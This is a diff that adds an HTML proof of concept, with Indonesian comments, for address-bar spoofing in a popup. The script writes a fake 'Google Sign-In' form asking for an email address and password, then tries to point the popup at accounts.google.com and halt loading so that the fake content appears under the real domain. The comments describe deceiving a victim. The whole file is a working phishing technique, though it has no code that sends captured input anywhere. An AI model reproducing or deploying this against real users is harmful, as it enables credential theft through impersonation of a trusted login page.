@@ -1,0 +1,36 @@
+<button onclick="testSpoof()">Clickme (Spoof Test)</button>
+<script>
+function testSpoof() {
+  // 1. Buka popup kosong
+  var w = window.open("", "", "width=800,height=600");
+
+  // 2. Tulis konten palsu seolah-olah dari bank atau login
+  w.document.write(`
+    <html>
+      <head><title>Google Account</title></head>
+      <body style="font-family:Arial;text-align:center;">
+        <h2>Google Sign-In</h2>
+        <p>Please enter your credentials:</p>
+        <input placeholder="Email" /><br><br>
+        <input placeholder="Password" type="password" /><br><br>
+        <button>Sign In</button>
+      </body>
+    </html>
+  `);
+
+  // 3. Spoof URL (redirect ke domain resmi untuk menyesatkan address bar)
+  setTimeout(function() {
+    // Ganti address bar ke domain resmi, tapi konten tetap palsu
+    try {
+      w.location.replace("https://accounts.google.com"); // terlihat sah
+    } catch (e) {
+      console.warn("Navigation blocked:", e);
+    }
+  }, 100); // delay cukup untuk menipu
+
+  // 4. Tambahan: mencegah reload agar korban tidak curiga
+  setTimeout(() => {
+    w.stop(); // hentikan loading agar konten tidak berubah
+  }, 500);
+}
+</script>
